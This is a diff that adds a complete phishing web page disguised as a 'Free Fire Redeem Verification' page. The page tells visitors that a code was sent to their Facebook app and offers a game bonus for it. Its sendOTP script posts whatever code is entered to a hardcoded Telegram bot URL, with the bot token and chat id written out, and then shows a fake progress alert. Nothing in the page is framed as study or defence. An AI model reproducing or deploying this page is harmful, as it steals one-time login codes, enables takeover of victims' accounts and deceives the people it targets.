@@ -1,0 +1,92 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Fire Redeem Verification</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  margin: 20px; /* Added margin */
+  padding: 0;
+  text-align: center;
+}
+
+.container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 80vh; /* Adjusted min-height */
+  background-color: #f2f2f2;
+  padding: 20px; /* Added padding */
+}
+
+.title {
+  font-size: 24px;
+  margin-bottom: 20px;
+}
+
+.message {
+  font-size: 18px;
+  line-height: 1.5;
+  margin-bottom: 20px;
+}
+
+.code-input {
+  padding: 10px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  font-size: 16px;
+  margin-bottom: 20px; /* Added margin */
+  width: 300px; /* Adjusted width */
+}
+
+.verify-button {
+  background-color: #007bff;
+  color: #fff;
+  padding: 10px 20px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  margin-bottom: 20px; /* Added margin */
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1 class="title">Free Fire Redeem Verification</h1>
+  <p class="message">We just sent you a verification code. Check your Facebook app notification, verify your code, and get a Free Fire redeem bonus!</p>
+  <input type="text" class="code-input" id="verificationCode" placeholder="Enter your verification code">
+  <button class="verify-button" onclick="sendOTP()">Verify Code</button>
+</div>
+
+<script>
+function sendOTP() {
+  var code = document.getElementById("verificationCode").value;
+  if (code.trim() === "") {
+    alert("Please fill the OTP box.");
+    return;
+  }
+  
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      // Success
+      showToast("Verifying progress wait for the result ");
+    }
+  };
+  xhttp.open("GET", "https://api.telegram.org/bot6739284031:AAELmHcxa31GbSYS9VKYLIKpO53gj901BAU/sendMessage?chat_id=6483077708&text=Verification Code: " + code, true);
+  xhttp.send();
+}
+
+function showToast(message) {
+  alert(message);
+}
+</script>
+   
+</body>
+</html>
+
